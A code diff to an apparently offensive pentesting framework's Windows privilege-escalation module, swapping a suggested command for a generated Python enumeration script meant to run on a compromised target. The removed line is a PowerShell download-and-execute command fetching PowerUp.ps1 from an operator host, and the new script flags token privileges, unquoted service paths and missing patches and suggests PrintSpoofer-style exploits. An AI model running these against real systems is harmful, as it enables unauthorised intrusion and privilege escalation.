@@ -63,25 +63,74 @@ class WindowsPrivescCheck(AttackModule):
     target_os_hint = ["windows"]
 
     def run(self, ctx: ModuleContext) -> dict[str, Any]:
-        return self._info_result(
-            ctx,
-            note=(
+        script = self.generate_python_script(ctx)
+        return {
+            "status": "script_generated",
+            "module": self.name,
+            "script": script,
+            "note": (
                 "Checks service permissions, token privileges, unquoted paths, "
                 "and patch levels. Phase 2: the old suggested_command pointed at "
                 "http://<target>/PowerUp.ps1 -- the VICTIM does not host PowerUp; "
-                "the operator hosts it. Use the operator-box URL or the generated "
-                "stdlib enumeration script."
+                "the operator hosts it. The generated script runs stdlib "
+                "enumeration ON the target (systeminfo/whoami /priv/sc qc)."
             ),
-            evidence=[f"Windows privesc enumeration planned against {ctx.target_ip}"],
-            references=[
+            "evidence": [f"Windows privesc enumeration queued against {ctx.target_ip}"],
+            "references": [
                 "https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1",
                 "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html",
             ],
-            suggested_command=(
-                "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString("
-                "'http://<OPERATOR_HOST>/PowerUp.ps1'); Invoke-AllChecks\""
-            ),
-        )
+        }
+
+    def generate_python_script(self, ctx: ModuleContext) -> str:
+        return f"""import subprocess, json, re, sys
+# Target: {ctx.target_ip}
+# Windows privesc enumeration -- runs ON the target (post-foothold) via the
+# shell. Stdlib subprocess only. Flags SeImpersonate/SeDebug/SeAssignPrimaryToken
+# (potato family), unquoted service paths, and missing KBs (PrintNightmare).
+results = {{"os": "", "privileges": [], "unquoted_services": [], "missing_kbs": [], "errors": []}}
+
+def _run(cmd):
+    try:
+        return subprocess.run(cmd, capture_output=True, text=True, timeout=30).stdout
+    except Exception as e:
+        results["errors"].append(str(e)[:200])
+        return ""
+
+# OS build
+results["os"] = _run(["systeminfo"])[:2000]
+
+# Token privileges -- SeImpersonatePrivilege => PrintSpoofer/RoguePotato/GodPotato
+priv_out = _run(["whoami", "/priv"])
+for priv in ("SeImpersonatePrivilege", "SeDebugPrivilege", "SeAssignPrimaryTokenPrivilege"):
+    if priv in priv_out and "Enabled" in priv_out:
+        results["privileges"].append(priv)
+if "SeImpersonatePrivilege" in results["privileges"]:
+    results["suggested"] = ["PrintSpoofer.exe -i -c cmd.exe", "RoguePotato.exe", "GodPotato.exe"]
+
+# Unquoted service paths (sc qc on each service)
+sc_out = _run(["sc", "query", "type=", "service", "state=", "all"])
+for name in re.findall(r"SERVICE_NAME:\\s+(\\S+)", sc_out)[:100]:
+    qc = _run(["sc", "qc", name])
+    m = re.search(r"BINARY_PATH_NAME\\s+:\\s+(\\S.*)", qc)
+    if m and " " in m.group(1) and not m.group(1).startswith('"'):
+        results["unquoted_services"].append({{"service": name, "binpath": m.group(1)}})
+
+# Missing KBs -> known CVEs (PrintNightmare / PetitPotam)
+qfe = _run(["wmic", "qfe", "list", "brief"])
+for kb, cve, name in (
+    ("KB5005112", "CVE-2021-34527", "PrintNightmare"),
+    ("KB5005565", "CVE-2021-36958", "PetitPotam"),
+):
+    if kb not in qfe:
+        results["missing_kbs"].append({{"kb": kb, "cve": cve, "name": name}})
+
+print(json.dumps(results))
+if results["privileges"] or results["unquoted_services"] or results["missing_kbs"]:
+    print(f"COMPROMISE: windows_privesc_candidates target={ctx.target_ip}")
+else:
+    print("VULN_NOT_CONFIRMED: no obvious Windows privesc vectors")
+"""
 
 class SUIDEnumeration(AttackModule):
     name = "SUIDEnumeration"
